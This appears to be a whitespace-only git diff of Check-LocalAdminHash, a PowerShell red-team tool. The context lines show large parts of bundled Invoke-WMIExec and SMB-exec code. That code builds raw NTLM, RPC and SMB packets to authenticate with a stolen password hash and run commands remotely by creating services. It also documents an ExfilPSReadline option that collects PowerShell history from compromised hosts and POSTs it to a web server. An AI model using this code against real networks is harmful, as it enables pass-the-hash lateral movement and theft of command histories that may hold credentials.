@@ -5,14 +5,14 @@ Function Check-LocalAdminHash{
     Author: Beau Bullock (@dafthack)
     License: BSD 3-Clause
     Required Dependencies: None
-    
+
     .SYNOPSIS
 
-    Check-LocalAdminHash attempts to authenticate to multiple hosts over either WMI or SMB using a password hash to determine if the provided credential is a local administrator. It's useful if you obtain a password hash for a user and want to see where they are local admin on a network. It is essentially a Frankenstein of two of my favorite tools along with some of my own code. It utilizes Kevin Robertson's (@kevin_robertson) Invoke-TheHash project for the credential checking portion. Additionally, the script utilizes modules from PowerView by Will Schroeder (@harmj0y) and Matt Graeber (@mattifestation) to enumerate domain computers to find targets for testing admin access against. 
+    Check-LocalAdminHash attempts to authenticate to multiple hosts over either WMI or SMB using a password hash to determine if the provided credential is a local administrator. It's useful if you obtain a password hash for a user and want to see where they are local admin on a network. It is essentially a Frankenstein of two of my favorite tools along with some of my own code. It utilizes Kevin Robertson's (@kevin_robertson) Invoke-TheHash project for the credential checking portion. Additionally, the script utilizes modules from PowerView by Will Schroeder (@harmj0y) and Matt Graeber (@mattifestation) to enumerate domain computers to find targets for testing admin access against.
 
     .DESCRIPTION
 
-    Check-LocalAdminHash attempts to authenticate to multiple hosts over either WMI or SMB using a password hash to determine if the provided credential is a local administrator. It's useful if you obtain a password hash for a user and want to see where they are local admin on a network. It is essentially a Frankenstein of two of my favorite tools along with some of my own code. It utilizes Kevin Robertson's (@kevin_robertson) Invoke-TheHash project for the credential checking portion. Additionally, the script utilizes modules from PowerView by Will Schroeder (@harmj0y) and Matt Graeber (@mattifestation) to enumerate domain computers to find targets for testing admin access against. 
+    Check-LocalAdminHash attempts to authenticate to multiple hosts over either WMI or SMB using a password hash to determine if the provided credential is a local administrator. It's useful if you obtain a password hash for a user and want to see where they are local admin on a network. It is essentially a Frankenstein of two of my favorite tools along with some of my own code. It utilizes Kevin Robertson's (@kevin_robertson) Invoke-TheHash project for the credential checking portion. Additionally, the script utilizes modules from PowerView by Will Schroeder (@harmj0y) and Matt Graeber (@mattifestation) to enumerate domain computers to find targets for testing admin access against.
 
     .PARAMETER Username
 
@@ -53,10 +53,10 @@ Function Check-LocalAdminHash{
     .PARAMETER Threads
 
     Defaults to 5 threads. (I've run into some odd issues setting threads more than 15 with some results not coming back.)
-    
+
     .PARAMETER ExfilPSReadline
 
-    For each system where auth is successful it runs a PowerShell command to locate PSReadLine console history files (PowerShell command history) and then POSTS them to a web server. See the Readme for server setup. 
+    For each system where auth is successful it runs a PowerShell command to locate PSReadLine console history files (PowerShell command history) and then POSTS them to a web server. See the Readme for server setup.
 
     .EXAMPLE
 
@@ -91,7 +91,7 @@ Function Check-LocalAdminHash{
         -----------
         This command attempts to perform a local authentication for the user Administrator against the system 192.168.0.16 over SMB.
 
-    
+
     .EXAMPLE
 
         C:\PS> Check-LocalAdminHash -Domain testdomain.local -UserDomain testdomain.local -Username PossibleAdminUser -PasswordHash E62830DAED8DBEA4ACD0B99D682946BB -AllSystems -ExfilPSReadline
@@ -139,7 +139,7 @@ Param
     [Parameter(Position = 8, Mandatory = $false)]
     [string]
     $CIDR = "",
-    
+
     [Parameter(Position = 9, Mandatory = $false)]
     [Int]
     $Threads = 5,
@@ -148,14 +148,14 @@ Param
     [Switch]
     $ExfilPSReadline
 )
-    
+
 
     $LocalAdminCheckBlock = {
                 param($Hostlist, $Username, $PasswordHash, $UserDomain, $Protocol, $ExfilPSReadLine)
-                    
-                     
+
+
        ##### Had to include Invoke-TheHash within this code block
-       ##### The rest of the Check-LocalAdminHash module is down near line 4616. 
+       ##### The rest of the Check-LocalAdminHash module is down near line 4616.
 
 
 ##############Copied Code From Invoke-WMIExec included from Kevin Robertson's Invoke-TheHash Starts Here#########
@@ -199,8 +199,8 @@ function Invoke-WMIExec
 .SYNOPSIS
 Invoke-WMIExec performs WMI command execution on targets using NTLMv2 pass the hash authentication.
 
-Author: Kevin Robertson (@kevin_robertson)  
-License: BSD 3-Clause 
+Author: Kevin Robertson (@kevin_robertson)
+License: BSD 3-Clause
 
 .PARAMETER Target
 Hostname or IP address of target.
@@ -210,7 +210,7 @@ Username to use for authentication.
 
 .PARAMETER Domain
 Domain to use for authentication. This parameter is not needed with local accounts or when using @domain after
-the username. 
+the username.
 
 .PARAMETER Hash
 NTLM password hash for authentication. This module will accept either LM:NTLM or NTLM format.
@@ -736,18 +736,18 @@ if($WMI_client_init.Connected)
     $WMI_client_receive = New-Object System.Byte[] 2048
     $RPC_UUID = 0xc4,0xfe,0xfc,0x99,0x60,0x52,0x1b,0x10,0xbb,0xcb,0x00,0xaa,0x00,0x21,0x34,0x7a
     $packet_RPC = New-PacketRPCBind 2 0xd0,0x16 0x02 0x00,0x00 $RPC_UUID 0x00,0x00
-    $packet_RPC["FragLength"] = 0x74,0x00    
+    $packet_RPC["FragLength"] = 0x74,0x00
     $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
     $WMI_client_send = $RPC
     $WMI_client_stream_init.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
-    $WMI_client_stream_init.Flush()    
+    $WMI_client_stream_init.Flush()
     $WMI_client_stream_init.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
     $assoc_group = $WMI_client_receive[20..23]
     $packet_RPC = New-PacketRPCRequest 0x03 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x05,0x00
     $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
     $WMI_client_send = $RPC
     $WMI_client_stream_init.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
-    $WMI_client_stream_init.Flush()    
+    $WMI_client_stream_init.Flush()
     $WMI_client_stream_init.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
     $WMI_hostname_unicode = $WMI_client_receive[42..$WMI_client_receive.Length]
     $WMI_hostname = [System.BitConverter]::ToString($WMI_hostname_unicode)
@@ -788,7 +788,7 @@ if($WMI_client_init.Connected)
         $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
         $WMI_client_send = $RPC
         $WMI_client_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
-        $WMI_client_stream.Flush()    
+        $WMI_client_stream.Flush()
         $WMI_client_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
         $assoc_group = $WMI_client_receive[20..23]
         $WMI_NTLMSSP = [System.BitConverter]::ToString($WMI_client_receive)
@@ -878,7 +878,7 @@ if($WMI_client_init.Connected)
         $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
         $WMI_client_send = $RPC
         $WMI_client_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
-        $WMI_client_stream.Flush()    
+        $WMI_client_stream.Flush()
         $causality_ID = [String](1..16 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
         [Byte[]]$causality_ID_bytes = $causality_ID.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
         $unused_buffer = [String](1..16 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
@@ -889,12 +889,12 @@ if($WMI_client_init.Connected)
         $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
         $WMI_client_send = $RPC + $DCOM_remote_create_instance
         $WMI_client_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
-        $WMI_client_stream.Flush()    
+        $WMI_client_stream.Flush()
         $WMI_client_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
 
         if($WMI_client_receive[2] -eq 3 -and [System.BitConverter]::ToString($WMI_client_receive[24..27]) -eq '05-00-00-00')
         {
-            Write-Output "[-] $output_username WMI access denied on $target_long"    
+            Write-Output "[-] $output_username WMI access denied on $target_long"
         }
         elseif($WMI_client_receive[2] -eq 3)
         {
@@ -908,7 +908,7 @@ if($WMI_client_init.Connected)
         }
         elseif($WMI_client_receive[2] -eq 2)
         {
-            
+
             Write-Verbose "[+] $output_username accessed WMI on $target_long"
 
             if($target_short -eq '127.0.0.1')
@@ -963,7 +963,7 @@ if($WMI_client_init.Connected)
 
                 $WMI_random_port = $WMI_random_port -replace "-00",""
                 $WMI_random_port = $WMI_random_port.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
-                [Int]$WMI_random_port_int = -join $WMI_random_port 
+                [Int]$WMI_random_port_int = -join $WMI_random_port
                 $MEOW = [System.BitConverter]::ToString($WMI_client_receive)
                 $MEOW = $MEOW -replace "-",""
                 $MEOW_index = $MEOW.IndexOf("4D454F570100000018AD09F36AD8D011A07500C04FB68820")
@@ -1016,7 +1016,7 @@ if($WMI_client_init.Connected)
             $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
             $WMI_client_send = $RPC
             $WMI_client_random_port_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
-            $WMI_client_random_port_stream.Flush()    
+            $WMI_client_random_port_stream.Flush()
             $WMI_client_random_port_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
             $assoc_group = $WMI_client_receive[20..23]
             $WMI_NTLMSSP = [System.BitConverter]::ToString($WMI_client_receive)
@@ -1133,13 +1133,13 @@ if($WMI_client_init.Connected)
             $NTLMSSP_verifier = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_verifier
             $WMI_client_send = $RPC + $rem_query_interface + $NTLMSSP_verifier
             $WMI_client_random_port_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
-            $WMI_client_random_port_stream.Flush()    
+            $WMI_client_random_port_stream.Flush()
             $WMI_client_random_port_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
             $WMI_client_stage = 'Exit'
 
             if($WMI_client_receive[2] -eq 3 -and [System.BitConverter]::ToString($WMI_client_receive[24..27]) -eq '05-00-00-00')
             {
-                Write-Output "[-] $output_username WMI access denied on $target_long"   
+                Write-Output "[-] $output_username WMI access denied on $target_long"
             }
             elseif($WMI_client_receive[2] -eq 3)
             {
@@ -1177,7 +1177,7 @@ if($WMI_client_init.Connected)
 
                 switch ($WMI_client_stage)
                 {
-            
+
                     'AlterContext'
                     {
 
@@ -1194,7 +1194,7 @@ if($WMI_client_init.Connected)
 
                             1
                             {
-                                $alter_context_call_ID = 0x04,0x00,0x00,0x00 
+                                $alter_context_call_ID = 0x04,0x00,0x00,0x00
                                 $alter_context_context_ID = 0x03,0x00
                                 $alter_context_UUID = 0x18,0xad,0x09,0xf3,0x6a,0xd8,0xd0,0x11,0xa0,0x75,0x00,0xc0,0x4f,0xb6,0x88,0x20
                                 $WMI_client_stage_next = 'Request'
@@ -1202,7 +1202,7 @@ if($WMI_client_init.Connected)
 
                             6
                             {
-                                $alter_context_call_ID = 0x09,0x00,0x00,0x00 
+                                $alter_context_call_ID = 0x09,0x00,0x00,0x00
                                 $alter_context_context_ID = 0x04,0x00
                                 $alter_context_UUID = 0x99,0xdc,0x56,0x95,0x8c,0x82,0xcf,0x11,0xa3,0x7e,0x00,0xaa,0x00,0x32,0x40,0xc7
                                 $WMI_client_stage_next = 'Request'
@@ -1214,11 +1214,11 @@ if($WMI_client_init.Connected)
                         $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
                         $WMI_client_send = $RPC
                         $WMI_client_random_port_stream.Write($WMI_client_send,0,$WMI_client_send.Length) > $null
-                        $WMI_client_random_port_stream.Flush()    
+                        $WMI_client_random_port_stream.Flush()
                         $WMI_client_random_port_stream.Read($WMI_client_receive,0,$WMI_client_receive.Length) > $null
                         $WMI_client_stage = $WMI_client_stage_next
                     }
-                  
+
                     'Request'
                     {
                         $request_split = $false
@@ -1247,14 +1247,14 @@ if($WMI_client_init.Connected)
                                     $auth_hostname_bytes += 0x00,0x00,0x00,0x00
                                 }
 
-                                $stub_data = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 + 
-                                                $causality_ID_bytes + 
-                                                0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00 + 
+                                $stub_data = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
+                                                $causality_ID_bytes +
+                                                0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00 +
                                                 $hostname_length +
                                                 0x00,0x00,0x00,0x00 +
                                                 $hostname_length +
                                                 $auth_hostname_bytes +
-                                                $process_ID_bytes + 
+                                                $process_ID_bytes +
                                                 0x00,0x00,0x00,0x00,0x00,0x00
 
                             }
@@ -1270,8 +1270,8 @@ if($WMI_client_init.Connected)
                                 $request_UUID = $IPID
                                 $WMI_client_stage_next = 'Request'
 
-                                $stub_data = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 + 
-                                                $causality_ID_bytes + 
+                                $stub_data = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
+                                                $causality_ID_bytes +
                                                 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
 
                             }
@@ -1421,7 +1421,7 @@ if($WMI_client_init.Connected)
 
                                 # thanks to @vysec for finding a bug with certain command lengths
                                 [String]$command_padding_check = $Command.Length / 4
-                                
+
                                 if($command_padding_check -like "*.75")
                                 {
                                     $command_bytes += 0x00
@@ -1438,7 +1438,7 @@ if($WMI_client_init.Connected)
                                 {
                                     $command_bytes += 0x00,0x00,0x00,0x00
                                 }
-                                
+
                                 $stub_data = 0x05,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                                 $causality_ID_bytes +
                                                 0x00,0x00,0x00,0x00,0x55,0x73,0x65,0x72,0x0d,0x00,0x00,0x00,0x1a,
@@ -1558,7 +1558,7 @@ if($WMI_client_init.Connected)
                                                 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                                 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x04,0x00,0x02,0x00,0x00,0x00,
                                                 0x00,0x00,0x00,0x00,0x00,0x00
-                                
+
                                 if($Stub_data.Length -lt $request_split_index)
                                 {
                                     $request_flags = 0x83
@@ -1615,7 +1615,7 @@ if($WMI_client_init.Connected)
 
                         $packet_NTLMSSP_verifier = New-PacketNTLMSSPVerifier $request_auth_padding 0x04 $sequence_number
                         $RPC = ConvertFrom-PacketOrderedDictionary $packet_RPC
-                        $NTLMSSP_verifier = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_verifier 
+                        $NTLMSSP_verifier = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_verifier
                         $RPC_signature = $HMAC_MD5.ComputeHash($sequence_number + $RPC + $stub_data + $NTLMSSP_verifier[0..($request_auth_padding + 7)])
                         $RPC_signature = $RPC_signature[0..7]
                         $packet_NTLMSSP_verifier["NTLMSSPVerifierChecksum"] = $RPC_signature
@@ -1648,7 +1648,7 @@ if($WMI_client_init.Connected)
                         }
 
                         if($WMI_client_receive[1145] -ne 9)
-                        { 
+                        {
                             $target_process_ID = Get-UInt16DataLength 1141 $WMI_client_receive
                             Write-Output "[+] Command executed with process ID $target_process_ID on $target_long"
                         }
@@ -1663,7 +1663,7 @@ if($WMI_client_init.Connected)
                 }
 
                 Start-Sleep -m $Sleep
-            
+
             }
 
             $WMI_client_random_port.Close()
@@ -1849,7 +1849,7 @@ function New-PacketSMBNegotiateProtocolRequest
     }
     else
     {
-        [Byte[]]$byte_count = 0x22,0x00  
+        [Byte[]]$byte_count = 0x22,0x00
     }
 
     $SMBNegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
@@ -1893,7 +1893,7 @@ function New-PacketSMBSessionSetupAndXRequest
     $SMBSessionSetupAndXRequest.Add("NativeOS",[Byte[]](0x00,0x00,0x00))
     $SMBSessionSetupAndXRequest.Add("NativeLANManage",[Byte[]](0x00,0x00))
 
-    return $SMBSessionSetupAndXRequest 
+    return $SMBSessionSetupAndXRequest
 }
 
 function New-PacketSMBTreeConnectAndXRequest
@@ -2032,7 +2032,7 @@ function New-PacketSMB2Header
 
     if($Signing)
     {
-        $flags = 0x08,0x00,0x00,0x00      
+        $flags = 0x08,0x00,0x00,0x00
     }
     else
     {
@@ -2100,7 +2100,7 @@ function New-PacketSMB2SessionSetupRequest
     $SMB2SessionSetupRequest.Add("PreviousSessionID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
     $SMB2SessionSetupRequest.Add("Buffer",$SecurityBlob)
 
-    return $SMB2SessionSetupRequest 
+    return $SMB2SessionSetupRequest
 }
 
 function New-PacketSMB2TreeConnectRequest
@@ -2430,14 +2430,14 @@ function New-PacketSCMOpenSCManagerW
     $packet_SCMOpenSCManagerW.Add("Database",[Byte[]](0x53,0x00,0x65,0x00,0x72,0x00,0x76,0x00,0x69,0x00,0x63,0x00,0x65,0x00,0x73,0x00,0x41,0x00,0x63,0x00,0x74,0x00,0x69,0x00,0x76,0x00,0x65,0x00,0x00,0x00))
     $packet_SCMOpenSCManagerW.Add("Unknown",[Byte[]](0xbf,0xbf))
     $packet_SCMOpenSCManagerW.Add("AccessMask",[Byte[]](0x3f,0x00,0x00,0x00))
-    
+
     return $packet_SCMOpenSCManagerW
 }
 
 function New-PacketSCMCreateServiceW
 {
     param([Byte[]]$ContextHandle,[Byte[]]$Service,[Byte[]]$ServiceLength,[Byte[]]$Command,[Byte[]]$CommandLength)
-                
+
     $referent_ID = [String](1..2 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
     $referent_ID = $referent_ID.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
     $referent_ID += 0x00,0x00
@@ -2621,7 +2621,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                         $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
 
                         try
-                        {    
+                        {
                             $client_stream.Write($client_send,0,$client_send.Length) > $null
                             $client_stream.Flush()
                             $client_stream.Read($client_receive,0,$client_receive.Length) > $null
@@ -2807,7 +2807,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
 
                             $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate $negotiate_flags
                             $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
-                            $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
+                            $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate
                             $packet_SMB_data = New-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate
                             $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                             $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
@@ -2820,7 +2820,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                             $packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 0x1f,0x00 $false $message_ID $process_ID $tree_ID $session_ID
                             $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate $negotiate_flags
                             $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
-                            $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
+                            $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate
                             $packet_SMB2_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_negotiate
                             $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                             $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
@@ -2829,11 +2829,11 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                         }
 
                         $client_stream.Write($client_send,0,$client_send.Length) > $null
-                        $client_stream.Flush()    
+                        $client_stream.Flush()
                         $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                         $stage = 'Exit'
                     }
-                    
+
                 }
 
             }
@@ -2947,7 +2947,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                 $packet_SMB_header["UserID"] = $SMB_user_ID
                 $packet_NTLMSSP_negotiate = New-PacketNTLMSSPAuth $NTLMSSP_response
                 $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
-                $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate      
+                $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate
                 $packet_SMB_data = New-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate
                 $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                 $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
@@ -2960,7 +2960,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                 $packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 0x01,0x00 $false $message_ID  $process_ID $tree_ID $session_ID
                 $packet_NTLMSSP_auth = New-PacketNTLMSSPAuth $NTLMSSP_response
                 $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
-                $NTLMSSP_auth = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_auth        
+                $NTLMSSP_auth = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_auth
                 $packet_SMB2_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_auth
                 $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                 $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
@@ -3070,11 +3070,11 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
             else
             {
                 $SMB_service_bytes += 0x00,0x00,0x00,0x00
-                
+
             }
 
         }
-        
+
         $SMB_service_length = [System.BitConverter]::GetBytes($SMB_service.Length + 1)
 
         if($CommandCOMSPEC -eq 'Y')
@@ -3095,22 +3095,22 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
         else
         {
             $SMBExec_command += '00-00-00-00'
-        }    
-        
-        $SMBExec_command_bytes = $SMBExec_command.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}  
+        }
+
+        $SMBExec_command_bytes = $SMBExec_command.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
         $SMBExec_command_length_bytes = [System.BitConverter]::GetBytes($SMBExec_command_bytes.Length / 2)
         $SMB_split_index = 4256
-        
+
         if($SMB_version -eq 'SMB1')
         {
             $stage = 'TreeConnectAndXRequest'
 
             while ($stage -ne 'Exit')
             {
-            
+
                 switch ($stage)
                 {
-            
+
                     'CheckAccess'
                     {
 
@@ -3120,7 +3120,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
 
                             if($SMB_execute)
                             {
-                                Write-Verbose "$output_username has Service Control Manager write privilege on $Target"  
+                                Write-Verbose "$output_username has Service Control Manager write privilege on $Target"
                                 $packet_SCM_data = New-PacketSCMCreateServiceW $SMB_service_manager_context_handle $SMB_service_bytes $SMB_service_length $SMBExec_command_bytes $SMBExec_command_length_bytes
                                 $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
 
@@ -3167,7 +3167,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                             $packet_SMB_header["Signature"] = $SMB_signing_sequence
                         }
 
-                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
+                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                         $packet_SMB_data = New-PacketSMBCloseRequest 0x00,0x40
                         $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                         $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
@@ -3175,7 +3175,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
 
                         if($SMB_signing)
                         {
-                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
+                            $SMB_sign = $session_key + $SMB_header + $SMB_data
                             $SMB_signature = $MD5.ComputeHash($SMB_sign)
                             $SMB_signature = $SMB_signature[0..7]
                             $packet_SMB_header["Signature"] = $SMB_signature
@@ -3209,7 +3209,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                         if($SMB_signing)
                         {
                             $packet_SMB_header["Flags2"] = 0x05,0x48
-                            $SMB_signing_counter = $SMB_signing_counter + 2 
+                            $SMB_signing_counter = $SMB_signing_counter + 2
                             [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                             $packet_SMB_header["Signature"] = $SMB_signing_sequence
                         }
@@ -3217,7 +3217,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                         $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                         $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x05,0x00,0x00,0x00 0x00,0x00 0x00,0x00
                         $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
-                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
+                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                         $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)
                         $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                         $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length
@@ -3253,7 +3253,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                             $packet_SMB_header["Signature"] = $SMB_signing_sequence
                         }
 
-                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
+                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                         $packet_SMB_data = New-PacketSMBNTCreateAndXRequest $SMB_named_pipe_bytes
                         $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                         $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
@@ -3261,7 +3261,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
 
                         if($SMB_signing)
                         {
-                            $SMB_sign = $session_key + $SMB_header + $SMB_data 
+                            $SMB_sign = $session_key + $SMB_header + $SMB_data
                             $SMB_signature = $MD5.ComputeHash($SMB_sign)
                             $SMB_signature = $SMB_signature[0..7]
                             $packet_SMB_header["Signature"] = $SMB_signature
@@ -3274,15 +3274,15 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                         $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                         $stage = 'RPCBind'
                     }
-                  
+
                     'CreateServiceW'
                     {
                         $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID
-                        
+
                         if($SMB_signing)
                         {
                             $packet_SMB_header["Flags2"] = 0x05,0x48
-                            $SMB_signing_counter = $SMB_signing_counter + 2 
+                            $SMB_signing_counter = $SMB_signing_counter + 2
                             [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                             $packet_SMB_header["Signature"] = $SMB_signing_sequence
                         }
@@ -3291,10 +3291,10 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                         $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data
                         $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00
                         $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
-                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   
+                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                         $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)
                         $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
-                             
+
                         $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length
                         $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                         $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
@@ -3324,7 +3324,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                         if($SMB_signing)
                         {
                             $packet_SMB_header["Flags2"] = 0x05,0x48
-                            $SMB_signing_counter = $SMB_signing_counter + 2 
+                            $SMB_signing_counter = $SMB_signing_counter + 2
                             [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00
                             $packet_SMB_header["Signature"] = $SMB_signing_sequence
                         }
@@ -3336,7 +3336,7 @@ if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$se
                         $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data
                         $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                         $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID $RPC_data.Length
-                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data     
+                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                         $RPC_data_length = $SMB_data.Length + $RPC_data.Length
                         $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length
                         $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
